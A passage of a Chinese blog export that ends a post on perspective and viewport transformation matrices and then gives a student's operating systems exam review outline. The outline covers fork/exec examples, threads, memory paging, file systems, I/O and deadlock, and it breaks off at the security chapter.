<p>将上述$z$替换为$n$，由第一条性质可得<br>$$<br>\begin{bmatrix} x\y\z\1\end{bmatrix}\Rightarrow\begin{bmatrix} \frac{nx}{z}\\frac{ny}{z}\unknown\1\end{bmatrix} &#x3D;&#x3D;\begin{bmatrix} nx\ny\unknown\z\end{bmatrix}\Rightarrow<br>\begin{bmatrix} x\y\n\1\end{bmatrix}\Rightarrow\begin{bmatrix} x\y\n\1\end{bmatrix} &#x3D;&#x3D;\begin{bmatrix} nx\ny\n^2\n\end{bmatrix}<br>$$<br>故与透射到正交的变换矩阵的第三行相乘有：<br>$$<br>\begin{bmatrix} C&amp;D&amp;A&amp;B\end{bmatrix}\begin{bmatrix} x\y\n\1\end{bmatrix}&#x3D;n^2<br>$$<br>不难得到$C&#x3D;D&#x3D;0$，而$An+B&#x3D;n^2$</p>
<p>同理由第二条性质可得：<br>$$<br>\begin{bmatrix} 0\0\f\1\end{bmatrix}\Rightarrow\begin{bmatrix} 0\0\f\1\end{bmatrix} &#x3D;&#x3D;\begin{bmatrix} 0\0\f^2\f\end{bmatrix}<br>$$<br>与透射到正交的变换矩阵的第三行相乘有$Af+B&#x3D;f^2$</p>
<p>最终，我们得到：$A&#x3D;n+f$，$B&#x3D;-nf$</p>
<p>即此变换矩阵为：<br>$$<br>M_{per\rightarrow orth}&#x3D;\begin{bmatrix} n &amp;0&amp;0&amp; 0 \0 &amp;n&amp;0&amp; 0\0&amp;0&amp;n+f&amp;-nf\0&amp;0&amp;1&amp;0\end{bmatrix}<br>$$<br>最后，将这个被压缩过的空间，重新正交投影成标准小立方体，故定义透视投影变换矩阵：<br>$$<br>M_{per}&#x3D;M_{orth}M_{per\rightarrow orth}<br>$$<br>计算结果为：<br>$$<br>M_{per}&#x3D;\begin{bmatrix} \frac{2n}{r-l} &amp;0&amp;\frac{l+r}{l-r}&amp; 0 \0 &amp;\frac{2n}{t-b}&amp;\frac{b+t}{b-t} &amp; 0\0&amp;0&amp;\frac{f+n}{n-f}&amp; -\frac{2fn}{f-n} \0&amp;0&amp;1&amp;0\end{bmatrix}<br>$$</p>
<h1 id="视口变换（Viewport-transformation）"><a href="#视口变换（Viewport-transformation）" class="headerlink" title="视口变换（Viewport transformation）"></a>视口变换（Viewport transformation）</h1><p>在经过了前面的MVP变换后，空间被转换为一个$[-1, 1]^3$这么一个立方体，接下来，需要将这个立方体画到屏幕上。这就需要用到视口变换，对于标准立方体$[-1, 1]^3$，先不管它的$Z$轴数据（由深度缓冲来处理），屏幕映射需要将$X$和$Y$轴$[-1, 1]^2$映射到屏幕坐标 $[0,width]*[0,height]$，和MVP变换类似，通过齐次坐标的矩阵，先将 $[-1, 1]^2$缩放至$[width, height]$，因为标准立方体中心在原点，而屏幕原点在左下角，所以还需要经过一个平移使得原点坐标对齐，将标准立方体转换成屏幕空间，变为窗口坐标系，变换矩阵为：<br>$$<br>M_{viewport}&#x3D;\begin{bmatrix} \frac{width}{2} &amp;0&amp;0&amp; \frac{width}{2} \0 &amp;\frac{height}{2}&amp;0 &amp; \frac{height}{2}\0&amp;0&amp;1&amp; 0 \0&amp;0&amp;0&amp;1\end{bmatrix}<br>$$</p>
<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>综上，我们就可以将游戏场景内任意可视物体转换到2D屏幕上了。具体变换矩阵为：<br>$$<br>M&#x3D;M_{viewport}M_{per}M_{view&#x2F;cam}M_{model}<br>$$</p>
]]></content>
      <categories>
        <category>计算机图形学</category>
      </categories>
      <tags>
        <tag>变换矩阵</tag>
      </tags>
  </entry>
  <entry>
    <title>西电软工操作系统复习纲要</title>
    <url>/2022/07/06/%E8%A5%BF%E7%94%B5%E8%BD%AF%E5%B7%A5%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0%E7%BA%B2%E8%A6%81/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting@1/dist/Meting.min.js"></script><h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>时间过得真快，转眼大二已经结束了。这学期软工的课程虽然不多，但是感觉都挺抽象的，个人也是在复习上下了比较大的功夫（主要是平时也没学），但最后的结果怎么说的，不咋地…</p>
<p>以下内容是个人根据复习提纲以及往年题进行的知识点总结，其中也会包含今年试题的回忆版，复习时只做了部分总结就没有发出来。考完试再着手一方面是帮助自己回忆os的相关知识，另一方面方便后来的学弟学妹可以借鉴一下。今年的成绩，贴张图自己体会吧…90+的只有12个人，当然没有我（哭）</p>
<img src="/2022/07/06/%E8%A5%BF%E7%94%B5%E8%BD%AF%E5%B7%A5%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0%E7%BA%B2%E8%A6%81/image-20220706142959467.png" alt="image-20220706142959467" style="zoom:30%;" loading="lazy">

<span id="more"></span>

<h2 id="第一章-引论（Overview）"><a href="#第一章-引论（Overview）" class="headerlink" title="第一章 引论（Overview）"></a>第一章 引论（Overview）</h2><p>引论是对整本书要学的知识点的总结，要点挺少的。</p>
<h3 id="一-什么是操作系统？"><a href="#一-什么是操作系统？" class="headerlink" title="一. 什么是操作系统？"></a>一. 什么是操作系统？</h3><ol>
<li>os是什么？</li>
</ol>
<p>答：是运行在内核态的软件（Software that runs in kernel mode），是源管理器（Source manager），扩展机器（extended machine），是用户与系统硬件的接口。</p>
<p><strong>2022原题：</strong></p>
<p>From the user’s point of view，the operating system is（<strong>A</strong>）</p>
<p>A. Extended machine, i.e. providing an abstract interface between user and computer hardware.<br>B. Software for limiting the speed of processes.<br>C. Software for organizing computer workflow reasonably.<br>D. A set of resources.</p>
<ol start="2">
<li>os的结构特征？</li>
</ol>
<p>答：层次结构（Layered）、虚拟机器（virtual machine）、庞大而单一的（monolithic）。</p>
<ol start="3">
<li>什么是系统调用（system call）？</li>
</ol>
<p>答：为了从操作系统获取服务，用户程序必须进行系统调用，该调用进入内核并调 用操作系统。TRAP指令从用户模式切换到内核模式，启动操作系统。当工作完成后，根据系统调 用之后的指令将控制返回给用户程序。</p>
<p>呃呃这个好像今年也考了一个概念题，背就行了。</p>
<h2 id="第二章-进程与线程（Process-amp-Thread）"><a href="#第二章-进程与线程（Process-amp-Thread）" class="headerlink" title="第二章 进程与线程（Process &amp; Thread）"></a>第二章 进程与线程（Process &amp; Thread）</h2><p>这章就是重量级咯，属于是十分重点的内容。</p>
<p>书上是这么说的：</p>
<blockquote>
<p>操作系统中最核心的概念是进程：这是对正在运行程序的一个抽象。操作系统的其他所有内容都是围绕着进程的概念展开的，所以，让操作系统的设计者（及学生）尽快并透彻地理解进程是非常重要的。</p>
</blockquote>
<h3 id="一-什么是进程"><a href="#一-什么是进程" class="headerlink" title="一. 什么是进程"></a>一. 什么是进程</h3><ol>
<li>什么是进程？</li>
</ol>
<p>答：正在运行的程序的实例。</p>
<ol start="2">
<li>进程与程序的本质区别？</li>
</ol>
<p>答：进程是动态的而程序是静态的（进程是程序的一次执行）；进程是暂时的，程序是永久的；进程和程序的组成不同。</p>
<ol start="3">
<li>fork( )和exec( )的区别？</li>
</ol>
<p>答：这个就十分重要了，可能你都没听说过，其实这是os课设中的内容。往年常考，算是老演员了。具体区别用下面两个例子来说明，问题是下面两段程序分别打印几个<code>os exam</code></p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
	<span class="token class-name">pid_t</span> pid<span class="token punctuation">;</span>
	pid <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span>pid <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"os exam\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span>pid <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span>
		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"os exam\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	
	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
	<span class="token class-name">pid_t</span> pid<span class="token punctuation">;</span>
	pid <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span>pid <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"os exam\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>其实知道fork( )和exec( )两个函数的作用这题就十分简单了。fork( )是由父进程创建一个一模一样的子进程，子进程从fork( )函数结束处开始执行，而父子进程之间执行的先后顺序是随机的，且此函数执行返回的结果为0。所以这题答案就是两次和一次了，首先第一段程序是父进程执行fork( )后生成子进程，pid&#x3D;0，之后父子进程执行后面的判断语句，父进程pid &gt; 0，子进程pid&#x3D;0，故打印两次；下面这题一样。</p>
<p>将第二段代码改一下呢？</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
	<span class="token class-name">pid_t</span> pid<span class="token punctuation">;</span>
	pid <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span>pid <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"os exam\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span>pid <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token function">execl</span><span class="token punctuation">(</span><span class="token string">"/bin/ls"</span><span class="token punctuation">,</span><span class="token string">"ls"</span><span class="token punctuation">,</span><span class="token string">"-1"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"os exam\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>	
	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>此段代码出现了execl( )，这又是啥呢？它其实是exec函数族中的一个函数。</p>
<img src="/2022/07/06/%E8%A5%BF%E7%94%B5%E8%BD%AF%E5%B7%A5%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0%E7%BA%B2%E8%A6%81/image-20220706150419474.png" alt="image-20220706150419474" style="zoom: 67%;" loading="lazy">

<p>exec函数族可以根据指定的文件名或目录名找到可执行文件，并用它来取代原调用进程的数据段、代码段和堆栈段。在执行完后，原调用进程的内容除了进程号外，其它全部被新程序的内容替换了。啥意思呢，可以简单地理解为执行exec函数族之后，其后面的代码都不执行了。回到题目，上述的 ”os exam“ 的打印次数肯定就是一次了。父进程打印一次，子进程会执行execl( )函数，之后的打印语句不再执行。</p>
<p>再来一题，20年原题：</p>
<p>For the program listed below, how many “hello” will be printed? Please explain your answer.</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	<span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"hello\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
	<span class="token function">execl</span><span class="token punctuation">(</span><span class="token string">"/bin/ls"</span><span class="token punctuation">,</span><span class="token string">"ls"</span><span class="token punctuation">,</span><span class="token string">"-l"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"hello\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>答案自行解决吧嘻嘻。这题22年也考了，作为最后一个大题，两个小问，第一个比较平常就问你打印次数，第二题就比较怪了，问你如何证明exec函数执行为啥之后的程序不会执行？（好像是这个吧，记不太清了，反正是问原理的，当然我不会zzz）</p>
<ol start="4">
<li>什么是shell？</li>
</ol>
<p>答：命令解释器。</p>
<ol start="5">
<li>进程创建的四种状态（four events for process creation）</li>
</ol>
<ul>
<li>系统初始化</li>
<li>正在运行的进程执行了一个创建进程的系统调用</li>
<li>用户请求创建一个新进程</li>
<li>一个批处理作业的初始化</li>
</ul>
<ol start="6">
<li>进程终止的四种状态（four events for process creation）</li>
</ol>
<ul>
<li>正常退出（自愿的）</li>
<li>出错退出（自愿的）</li>
<li>严重错误（非自愿的）</li>
<li>被其他进程杀死  （非自愿的）</li>
</ul>
<ol start="7">
<li>什么是PCB？</li>
</ol>
<p>答：PCB（process control block）进程控制块。包含寄存器，程序寄存器，程序状态字psw，堆栈指针，堆栈状态，进程ID。每一个进程都对应一个PCB，是进程存在的唯一标志。</p>
<ol start="8">
<li>进程的五种状态：创建（new）、就绪（ready）、运行（run）、阻塞（block）、终止（terminated）</li>
</ol>
<h3 id="二-什么是线程"><a href="#二-什么是线程" class="headerlink" title="二. 什么是线程"></a>二. 什么是线程</h3><ol>
<li>什么是线程？线程与进程的区别？</li>
</ol>
<p>答：线程是轻量级进程。二者区别：线程有自己的程序计数器，寄存器，堆栈，状态。可以共享进程的地址空间，全局变量，打开文件等。进程是资源的管理者，线程是进程中运行的实体，是cpu的调用者。</p>
<p>这题今年作为简答题出现。</p>
<ol start="2">
<li>什么是用户级线程，什么是内核级线程，其各自的优缺点是什么？</li>
</ol>
<p>答：① 用户级线程  User Level Thread：线程表在用户空间，进程表在内核空间。内核不知道线程的存在。</p>
<p>​			优点：线程的切换不需要陷入内核，进行上下文切换；允许进程有自己的调度算法</p>
<p>​			缺点：线程阻塞时会导致进程的阻塞。</p>
<p>​		② 内核级线程 Kernel Level Thread：线程表和进程表都在内核空间。</p>
<p>​			优点：线程阻塞时可以检查是否有其他可运行的线程（不止当前进程，也有可能其他进程）</p>
<p>​			缺点：线程切换开销很大</p>
<h3 id="三-进程间通信"><a href="#三-进程间通信" class="headerlink" title="三. 进程间通信"></a>三. 进程间通信</h3><p>这边的概念以及程序都十分重要，集中在70-83页，理解并会写代码，很可能考代码补全，虽然22年没考…其中peterson算法，TSL避免死锁，信号量解决生产者消费者（有一年考了利用线程解决生产者消费者问题，书上93页有代码，其实和其他方法大差不差，但是其中有的函数名称不看的话可能不知道）都是很重要的。</p>
<ol>
<li>竞争条件 Race condition：两个或多个进程读写某些共享数据，而最后的结果取决于进程运行的精确时序。</li>
<li>互斥 mutual exclusion：以某种手段确保，当一个进程在使用共享变量或文件时，其他进程不能进行同样操作。</li>
<li>四种解决互斥的方案 four conditions to hold to have a good solution for race condition&#x2F;mutual exclusion：<ul>
<li>任何两个进程不能同时处于临界区</li>
<li>不应对CPU的速度和数量作出假设</li>
<li>临界区外运行的进程不能阻塞其他进程</li>
<li>不能使进程无期限等待进入临界区</li>
</ul>
</li>
<li>临界区 critical region：对共享内存进行访问的程序片段称为临界区。</li>
<li>自旋锁 spin lock：用于忙等待，也叫忙等锁（busy-waiting lock）</li>
<li>自旋锁和信号量的区别？信号量和互斥量的区别？</li>
</ol>
<p>答：自旋锁是自选等待，用于忙等待，对系统负载大，浪费cpu时间，效率较高，是关抢占的；信号量是睡眠等待，对系统消耗小，因为进行了进程间的切换效率较低，没有关抢占。信号量的值是0或者正数，而互斥量的值只能是0或者1；信号量一般是实现在内核态的，而互斥量是实现在用户态的。</p>
<ol start="7">
<li>管程：是一个由过程，变量，数据结构组成的一个集合。进程只能通过访问管程中的过程来访问过程中的数据结构。</li>
</ol>
<h3 id="四-调度"><a href="#四-调度" class="headerlink" title="四. 调度"></a>四. 调度</h3><p>进程调度算法，主要掌握FCFS、SJF、Round-Robin、Multiple Queue四种方法即可，考的比较少，近几年都没有考到。</p>
<p>但是这种调度方法还是要掌握的，对进程就绪、运行等状态有更好的认识，且跟后面的页面调度算法类似，要注意会画调度的甘特图。</p>
<h3 id="五-经典IPC问题"><a href="#五-经典IPC问题" class="headerlink" title="五. 经典IPC问题"></a>五. 经典IPC问题</h3><p>老演员了，哲学家进餐和读者写者问题。书上的代码，理解会写。</p>
<h2 id="第三章-内存管理（Memory-Management）"><a href="#第三章-内存管理（Memory-Management）" class="headerlink" title="第三章 内存管理（Memory Management）"></a>第三章 内存管理（Memory Management）</h2><p>也是一个重点章节，22级考的特别多…</p>
<h3 id="一-虚拟内存"><a href="#一-虚拟内存" class="headerlink" title="一. 虚拟内存"></a>一. 虚拟内存</h3><ol>
<li><p>static relocation &amp; dynamic relocation</p>
<p>静态重定位：用户程序加载到内存时，一次性实现逻辑地址到物理地址的转化。把作业装入内存时的地址变化。当一个程序装载到地址x时，常数x被加到每一个程序地址上。</p>
<p>动态重定位：在逐条指令执行时，完成地址转换。在装载时无需重定位。</p>
</li>
<li><p>Paging：物理内存按照固定大小划分成若干单元，单元就是页框。</p>
</li>
<li><p>MMU：memory management unit内存管理单元，虚拟地址被送到MMU，MMU将虚拟地址映射为物理地址</p>
</li>
<li><p>Page Table：页表的目的就是将虚拟页面映射成页框。页表由页表项构成。实际内存的每个页框对应了一个表项，而不是每个虚拟页面对应一个表项。</p>
</li>
<li><p>TLB：Translation Looked aside buffer转换检测缓冲区，又叫快表。</p>
<p>计算机的一个小型硬件设备，将虚拟地址直接映射到物理地址，不需要再访问页表，通常在MMU中，包含少量的表项。当虚拟地址放入MMU中时，首先通过硬件在TLB中将虚拟页号与TLB中所有表项进行同时匹配，如果有效匹配，则取出页框号，不用访问页表。如果虚拟页号不在TLB中，MMU就会进行正常的页表查找，并且替换TLB 的表项。</p>
</li>
</ol>
<h3 id="二-页面置换算法"><a href="#二-页面置换算法" class="headerlink" title="二. 页面置换算法"></a>二. 页面置换算法</h3><p>没啥好说的，OPT、FIFO、LRU都要掌握，这三种今年都考了，问你缺页次数。看个例题吧：</p>
<img src="/2022/07/06/%E8%A5%BF%E7%94%B5%E8%BD%AF%E5%B7%A5%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0%E7%BA%B2%E8%A6%81/image-20220706161229230.png" alt="image-20220706161229230" style="zoom: 80%;" loading="lazy">

<img src="/2022/07/06/%E8%A5%BF%E7%94%B5%E8%BD%AF%E5%B7%A5%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0%E7%BA%B2%E8%A6%81/image-20220706161254052.png" alt="image-20220706161254052" style="zoom:80%;" loading="lazy">

<h3 id="三-内存动态分区分配"><a href="#三-内存动态分区分配" class="headerlink" title="三. 内存动态分区分配"></a>三. 内存动态分区分配</h3><p>也没啥好说的，首次适应、最好适应、最坏适应、领近适应，今年考了。这是原题：</p>
<p><img src="/2022/07/06/%E8%A5%BF%E7%94%B5%E8%BD%AF%E5%B7%A5%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0%E7%BA%B2%E8%A6%81/image-20220706161511825.png" alt="image-20220706161511825" loading="lazy"></p>
<img src="/2022/07/06/%E8%A5%BF%E7%94%B5%E8%BD%AF%E5%B7%A5%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0%E7%BA%B2%E8%A6%81/image-20220706161537321.png" alt="image-20220706161537321" style="zoom:67%;" loading="lazy">

<h3 id="四-系统设计问题"><a href="#四-系统设计问题" class="headerlink" title="四. 系统设计问题"></a>四. 系统设计问题</h3><p>可把我坑惨了，我没细看，结果考了两题。</p>
<ol>
<li>Memory mapped files：进程通过一个系统调用(mmap)，将一个文件映射到其虚拟地址空间的一部分。对文件的读写，就像内存中的字符数组，而不用通过读写来访问文件。（这个考了）</li>
<li>DLL：shared library，dynamic linked libraries 共享库又称动态链接库，当一个程序和一个共享库链接时，连接器并没有加载所有的函数，有的函数只是加载了一段能在运行时绑定被调用函数的存根历程。当一个共享库被装载和使用时，整个库并不是一次性并装入内存。而是根据需要，以页面为单位装载的，没有被调用的函数是不会被装入内存的。（这个考了）</li>
<li>Shared Pages:进程实用相同的 i 空间页表。</li>
</ol>
<h2 id="第四章-文件系统（File-System）"><a href="#第四章-文件系统（File-System）" class="headerlink" title="第四章 文件系统（File System）"></a>第四章 文件系统（File System）</h2><h3 id="一-文件系统的实现"><a href="#一-文件系统的实现" class="headerlink" title="一. 文件系统的实现"></a>一. 文件系统的实现</h3><ol>
<li>hard link &amp; soft link</li>
</ol>
<p>​		硬链接：两个文件目录指向一个inode；磁盘块不列入目录，列入目录的是i节点</p>
<p>​		软连接：符号链接，创建一个链接文件link，文件内容为要共享的文件的路径，把该文件放在B的目录下，只有真正的文件拥有者才拥有者真正的Inode。</p>
<ol start="2">
<li>FAT作用</li>
</ol>
<p>​		FAT表：取出每个磁盘块的指针字，放到内存的一个表中。</p>
<p>​		作用：整个块都可以存放数据（不用第一个字放指针），随机访问也变容易了）。只要目录项中记录一个整数，按照它可以找到文件的所有块。</p>
<ol start="3">
<li>inode：最后一个记录了各个文件分别包含哪些磁盘块的方式是给每个文件赋予一个称为 i 节点的数据结构，其中列出了文件属性和文件块的磁盘地址。给定 i 节点，就能找到文件的所有块。</li>
<li>inode相较于FAT的优势：只有在文件打开时，i 节点才在内存中，为了打开文件而保留 i 节点的数组所占据的空间比FAT表要小得多。（今年考了）</li>
</ol>
<h3 id="二-杂项"><a href="#二-杂项" class="headerlink" title="二. 杂项"></a>二. 杂项</h3><ol>
<li><p>LFS：把磁盘当成一个大的循环使用的Log，每次 都是从当前位置连续向后写，写到末尾，再返回从头 开始向后写，这样就可大大降低寻道时间。所有的写操作最初都被缓冲在内存中，然后周期性的把已缓冲的写作为一个单独的段，在日志的末尾写入磁盘。要打开一个文件，则首先需要在i节点图中找到文件i节点。一旦文件定位后就可以找到相应的块的地址。</p>
</li>
<li><p>Journaling File System:保存一个用于记录系统下一步要做什么的日志。</p>
</li>
<li><p>VFS：将多种的文件系统统一成一个有序的结构。抽象出所有文件系统的共有部分，并将这部分代码放在单独的一层，该层调用底层的实际文件系统来管理数据。</p>
</li>
</ol>
<p>呃呃反正22级没考。</p>
<h2 id="第五章-输入-x2F-输出（Input-x2F-Output）"><a href="#第五章-输入-x2F-输出（Input-x2F-Output）" class="headerlink" title="第五章 输入&#x2F;输出（Input&#x2F;Output）"></a>第五章 输入&#x2F;输出（Input&#x2F;Output）</h2><ol>
<li><p>Memory-Mapped I&#x2F;O  definition：内存映射IO,将所有控制器映射到内存空间中，每个控制器被分配唯一的一个内存地址，并且不会有内存被分配这个地址。这样的系统称为内存映射I&#x2F;O。</p>
</li>
<li><p>Programmed I&#x2F;O &amp;Interrupted-Driven I&#x2F;O &amp;DMA I&#x2F;O difference   </p>
<p>这一章讲的不深，最重要的也就这个知识点了，年年考</p>
<p>Programmed I&#x2F;O：CPU一直检查外设</p>
<p>Interrupted-Driven I&#x2F;O：允许CPU在等待外设的时候，做些其他的事情，使用中断机制，中断发生在每个字符上。</p>
<p>IO using DMA：每个缓冲区中断一次，CPU可以自由在IO期间做其他事情。数据传输由DMA在内存和I&#x2F;O中完成。</p>
</li>
<li><p>磁臂调度算法：FCFS、SSF、ELEVATOR。看个例题就理解了，22年没考</p>
</li>
</ol>
<img src="/2022/07/06/%E8%A5%BF%E7%94%B5%E8%BD%AF%E5%B7%A5%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0%E7%BA%B2%E8%A6%81/image-20220706163145358.png" alt="image-20220706163145358" style="zoom: 67%;" loading="lazy">

<img src="/2022/07/06/%E8%A5%BF%E7%94%B5%E8%BD%AF%E5%B7%A5%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0%E7%BA%B2%E8%A6%81/image-20220706163214141.png" alt="image-20220706163214141" style="zoom:67%;" loading="lazy">

<h2 id="第六章-死锁（Deadlock）"><a href="#第六章-死锁（Deadlock）" class="headerlink" title="第六章 死锁（Deadlock）"></a>第六章 死锁（Deadlock）</h2><ol>
<li><p>Deadlock：如果一个进程集合中的每一个进程都在等待只能由该进程集合中的其他进程才能引发的事件，那么该进程集合就是死锁的。</p>
</li>
<li><p>四个死锁必要条件及解决方案</p>
</li>
</ol>
<ul>
<li>互斥条件：将临界资源改造为可共享使用的资源，如spooling技术</li>
<li>占有并等待：运行前分配好所有需要的资源，之后一直保持</li>
<li>不可抢占条件：申请的资源得不到满足时，立即释放拥有的所有资源；申请的资源被其他进程占用时，由操作系统协作剥夺</li>
<li>环路等待：给资源编号，必须按照编号从小到大的顺序申请资源</li>
</ul>
<ol start="3">
<li><p>safe state：没有死锁发生，即使每一个进程突然请求对资源的最大需求，也可能存在某种调度次序能够使每一个进程运行完毕。</p>
</li>
<li><p>Unsafe state：从安全状态出发，系统能保证所有的进程都能完成，从不安全状态出发，就没有这样的保证。</p>
</li>
</ol>
<p>安全状态不一定一定不会发生死锁。不安全状态也不代表当前状态就是死锁状态，当前状态也可能是非死锁，但继续向下运行，一定发生死锁。</p>
<ol start="5">
<li><p>银行家算法：你懂的，必考，也不难</p>
<img src="/2022/07/06/%E8%A5%BF%E7%94%B5%E8%BD%AF%E5%B7%A5%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0%E7%BA%B2%E8%A6%81/image-20220706170058754.png" alt="image-20220706170058754" style="zoom:67%;" loading="lazy">

<img src="/2022/07/06/%E8%A5%BF%E7%94%B5%E8%BD%AF%E5%B7%A5%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0%E7%BA%B2%E8%A6%81/image-20220706170135013.png" alt="image-20220706170135013" style="zoom:67%;" loading="lazy">
</li>
<li><p>两阶段锁two-phase lock：第一阶段进程对所有所需的记录进行加锁，一次锁住一个记录。第二阶段完成更新然后释放锁。如果第一阶段某个进程需要的记录已经被加锁，该进程释放它所有加锁的记录，然后重新开始第一阶段。</p>
</li>
<li><p>活锁live lock：两个进程都在运行，但都没有实质性的进展。当进程意识到它不能获得下一个锁，就会释放已经得到的锁，然后等待一段时间，再尝试一次。当几个进程同时这么做。这个过程没有进程阻塞，甚至可以说进程正在活动，然而进程并不会继续往下执行，称为活锁。</p>
</li>
<li><p>饿死：进程永远得不到执行。</p>
</li>
</ol>
<p>知识点6、7、8可以忽略，基本不考…</p>
<h2 id="第七章-多机系统（Multiprocessor-System）"><a href="#第七章-多机系统（Multiprocessor-System）" class="headerlink" title="第七章 多机系统（Multiprocessor System）"></a>第七章 多机系统（Multiprocessor System）</h2><p>记住这张图就好…</p>
<img src="/2022/07/06/%E8%A5%BF%E7%94%B5%E8%BD%AF%E5%B7%A5%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0%E7%BA%B2%E8%A6%81/image-20220706165225722.png" alt="image-20220706165225722" style="zoom:67%;" loading="lazy">

<h2 id="第八章-安全（Security）"><a href="#第八章-安全（Security）" class="headerlink" title="第八章 安全（Security）"></a>第八章 安全（Security）</h2><ol>
<li><p>Security Goals &amp; Threats</p>
<ul>
<li>机密性    数据暴露</li>
<li>完整性    数据篡改</li>
